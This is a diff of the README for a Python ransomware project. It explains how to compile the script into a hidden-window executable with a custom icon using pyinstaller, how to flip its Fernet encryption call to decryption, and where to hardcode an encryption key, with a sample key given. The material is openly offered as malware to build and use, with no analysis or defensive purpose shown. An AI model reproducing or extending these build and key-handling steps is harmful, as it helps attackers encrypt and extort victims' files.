@@ -29,14 +29,15 @@ To Convet .py File to exe : <code>pyinstaller --onefile -w --icon YourIcon.ico R
 Change Ransomware.py On line 48 From : 
 <img src="https://github.com/cy4nguy/Python-Ransomware/blob/master/R2.png?raw=true"></img><br>
 To This :<br>
-<code>
+<code><br>
+                FileName    = loc.Target                # File name<br>
+                Encrypted   = loc.FernetM.decrypt(Date) #  Channge Encrypt To decrypt tmp Var<br>
+</code><br>
 
-</code
-
-And line 27 From this : 
+And line 27 From this : <br>
 <img src="https://github.com/cy4nguy/Python-Ransomware/blob/master/R1.png?raw=true"></img><br>
 to This:<br>
-<code>
+<code><br>
    Key         = b'68pNFX3kb9GplysL7XKfpdLLhlSrwZFEnFUuy54nEyY # Replace Your Key hare<br>
    FKey        = Fernet(Key)                                   # Our Fernet Moudle<br>
 
